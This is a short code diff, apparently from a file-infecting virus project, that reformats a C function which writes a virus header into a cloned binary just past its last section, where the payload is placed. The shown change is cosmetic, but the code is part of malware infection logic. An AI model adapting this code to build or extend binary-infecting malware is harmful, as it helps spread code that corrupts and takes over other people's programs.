@@ -1,4 +1,3 @@
-
 #include "virus.h"
 #include "errors.h"
 #include "utils.h"
@@ -40,16 +39,17 @@
 ** Note that relative_entry_address is in the opposite direction !
 */
 
-bool		setup_virus_header(struct safe_ptr clone_ref, \
-			size_t end_of_last_section,           \
+bool		setup_virus_header(struct safe_ptr clone_ref,
+			size_t end_of_last_section,
 			struct virus_header vhdr)
 {
-	const size_t	payload_off       = end_of_last_section;
-	const size_t	virus_header_off  = payload_off + vhdr.dist_header_loader;
+	const size_t	payload_off = end_of_last_section;
+	const size_t	header_off  = payload_off + vhdr.dist_header_loader;
 
-	void	*constants_location = safe(clone_ref, virus_header_off, sizeof(vhdr));
+	void	*constants_location = safe(clone_ref, header_off, sizeof(vhdr));
 
-	if (!constants_location) return errors(ERR_VIRUS, _ERR_V_CANT_READ_CONSTANTS);
+	if (constants_location == NULL)
+		return errors(ERR_VIRUS, _ERR_V_CANT_READ_CONSTANTS);
 
 	memcpy(constants_location, &vhdr, sizeof(vhdr));
 
